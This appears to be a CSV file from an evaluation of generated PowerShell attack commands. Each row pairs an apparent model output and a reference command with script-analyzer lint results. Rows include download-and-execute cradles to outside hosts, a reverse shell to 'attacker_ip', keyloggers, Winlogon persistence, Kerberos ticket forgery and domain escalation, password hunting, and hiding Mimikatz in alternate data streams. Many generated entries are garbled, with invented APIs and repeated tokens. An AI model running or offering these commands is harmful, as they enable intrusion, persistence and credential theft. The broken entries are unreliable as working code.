"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name T1112 -Value ""<script>""","Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, ${binaryToExec}"" -Force",[''],[''],[''],['PSAvoidUsingPositionalParameters '],"[""Cmdlet 'Set-ItemProperty' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]",['Information']
Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')},Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') },"['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']","['RedirectionNotSupported ', ' PSAvoidUsingInvokeExpression ']","[""The '<' operator is reserved for future use. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']"
Get-ChildItem -Path .\current,dir,[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Import-Module .\Cert:\LocalMachine\Root\T1027.006\bin\T1027_006_remote.pfx -Force; ; $cert = ""C:\LocalMachine\Root\T1027_006_remote.pfx"";","$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'cert' is assigned but never used. ""]",['Warning'],[''],[''],['']
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSI_p}' },Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },[''],[''],[''],[''],[''],['']
Invoke-ExecuteMSBuild,Invoke-ExecuteMSBuild,[''],[''],[''],[''],[''],['']
$wininit = Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'wininit' is assigned but never used. ""]",['Warning'],[''],[''],['']
Get-DomainComputer,Get-Domain,[''],[''],[''],[''],[''],['']
krbtgt.exe hash /domain:sub.domain.local /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe /sid:S-1-5-21-1473643419-774954089-2222329127 /root:dc.sub.domain.local /krbtgt:exe /domain:sub.domain.local /krbtgt:exe,ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,[''],[''],[''],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
"gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password' 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKLM:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';gp 'HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\"" 'Password1' 'Password4' 'Password5' 'Password6' 'Password","$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}","['TerminatorExpectedAtEndOfString ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingPositionalParameters ']","['The string is missing the terminator: "". ', "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" Cmdlet 'gp' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' Warning ', ' Warning ', ' Information']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Get-PassHashes -LocalFilePath 'C:\windows\psdrt\psdrt.dit',"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
$function = 'Get-Process'; $renamedFunction = $function + '-' + $renamedFunction; Invoke-Expression $renamedFunction,Function MyGetProc { Get-Process }; MyGetProc,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Rubeus.exe asktgs /service:cifs /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap,Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,[''],[''],[''],[''],[''],['']
"Invoke-SQLAudit -Verbose -Instance ""dcorp-mssql.dollarcorp.moneycorp.local""","Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -OU 1.2.840.113556.1.4.803:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0,Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',[''],[''],[''],[''],[''],['']
$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.txt -LogPath ${output_file},$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,['UnexpectedToken '],"[""Unexpected token '\\T1056.001\\src\\Get-Keystrokes.txt' in expression or statement. ""]",['ParseError'],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress},netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
"gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'","gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ""powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')""'",Find-DomainShare -CheckShareAccess,[''],[''],[''],[''],[''],['']
"(gci c:\ -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | Select-String -Pattern 'ip_hostname.txt'","$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt","['MissingEndParenthesisInExpression ', ' PSAvoidUsingCmdletAliases ']","[""Missing closing ')' in expression. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
"raiseChild.py < child_domain>/username@10.10.10.10 | select samaccountname , description , pwdlastset , logoncount , badpwdcount",raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,"['RedirectionNotSupported ', ' PSAvoidUsingCmdletAliases ']","[""The '<' operator is reserved for future use. "", "" 'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning']",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"$share = New-SmbShare -Name ""sharedir"" -Force; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://anyone.com/sharedir.ps1')","new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""","['PSAvoidUsingInvokeExpression ', ' PSUseDeclaredVarsMoreThanAssignments ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The variable 'share' is assigned but never used. ""]","['Warning ', ' Warning']",[''],[''],['']
"$stream = Get-Stream -Name 'evadump' ; Add-Type -TypeDefinition @' using System; using System.Runtime.InteropServices; public class EventStream { [DllImport('evadump.dll')] public static extern bool OpenStream(IntPtr hWndNewOwner); [DllImport('evadump.dll')] public static extern bool CloseStream(); [DllImport('evadump.dll')] public static extern IntPtr GetData(uint uFormat); [DllImport('evadump.dll')] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport('evadump.dll')] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport('evadump.dll')] public static extern int GlobalSize(IntPtr hMem); } ""@ $stream.OpenStream([IntPtr]::Zero) $stream.CloseStream()",$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,"['UnexpectedCharactersAfterHereStringHeader ', ' PSUseDeclaredVarsMoreThanAssignments ']","['No characters are allowed after a here-string header but before the end of the line. ', "" The variable 'stream' is assigned but never used. ""]","['ParseError ', ' Warning']",[''],[''],['']
"(gwmi -class Win32_User -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq ""Auto"" -and $_.PathName -notlike ""C:\Windows*"" -and $_.PathName -notlike '""*'} | select S-1-5-21-3263068140-2042698922-2891547269-1126",([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,"['MissingEndParenthesisInExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""Missing closing ')' in expression. "", "" 'Where' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' Warning ', ' Warning']",[''],[''],['']
$path = 'C:\windows\psdrt\psdrt.dit'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($path); $sendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback $encodedSendback,$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,"['UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSUseDeclaredVarsMoreThanAssignments ']","[""Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" Unexpected token '$encodedSendback' in expression or statement. "", "" The variable 'bytes' is assigned but never used. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Warning']",[''],[''],['']
"$script = 'Get-Process'; $buffer = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $script.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); powershell.exe -Command $encodedSendback $attacker_ip; $stream.Flush()}; $script.Close()",$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,"['MissingExpressionAfterToken ', ' UnexpectedToken ', ' MissingEndParenthesisInExpression ', ' UnexpectedToken ', ' PSAvoidUsingInvokeExpression ', ' PSUseDeclaredVarsMoreThanAssignments ', ' PSAvoidUsingPositionalParameters ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""Missing expression after ','. "", "" Unexpected token 'attacker_port' in expression or statement. "", "" Missing closing ')' in expression. "", "" Unexpected token ')' in expression or statement. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" The variable 'buffer' is assigned but never used. "", "" Cmdlet 'New-Object' has positional parameter. Please use named parameters instead of positional parameters when calling a command. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Warning ', ' Warning ', ' Information ', ' Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-ForestGlobalCatalog -Forest local.domain ; Get-DomainTrust -SearchBase ""GC://$($ENV:USERDNSDOMAIN)""",Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
"Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class Keylogging { [DllImport(""user32.dll"")] public static extern bool OpenKey(IntPtr hWndNewOwner); [DllImport(""user32.dll"")] public static extern bool CloseKey(); [DllImport(""user32.dll"")] public static extern IntPtr GetKeystrokes(uint uFormat); [DllImport(""kernel32.dll"")] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport(""kernel32.dll"")] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport(""kernel32.dll"")] public static extern int GlobalSize(IntPtr hMem); } ""@ [Keylogging]::OpenKey([IntPtr]::Zero) $key = [Keylogging]::GetKeystrokes(13) CF_TEXT format $buffer = New-Object byte[]","Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(""user32.dll"")] public static extern int GetAsyncKeyState(Int32 i); } ""@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }","['UnexpectedCharactersAfterHereStringHeader ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' Information']","['UnexpectedCharactersAfterHereStringHeader ', ' MissingEndParenthesisInExpression ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' MissingEndParenthesisAfterStatement ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Missing closing ')' in expression. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'eq' in expression or statement. "", "" Missing closing ')' after expression in 'if' statement. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'Write-Host' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Information']"
$code = 'IEX (New-Object Net.WebClient).DownloadString('https://malicious_site.com/malicious_code.ps1')'; Invoke-Expression $code,"Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(""Executed""); } }'; [MyClass]::Run()","['UnexpectedToken ', ' PSAvoidUsingInvokeExpression ']","[""Unexpected token 'https://malicious_site.com/malicious_code.ps1')'' in expression or statement. "", ' Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ']","['ParseError ', ' Warning']",[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://10.9.122.8:8080/AZPLhG9txdFhS9n')""",powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","Get-NetFirewallRule -DisplayGroup ""Remote Desktop"" | Set-NetFirewallRule -Enabled True",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ""powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')""'","Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq ""Accessible"" } | Get-SQLServerInfo",[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
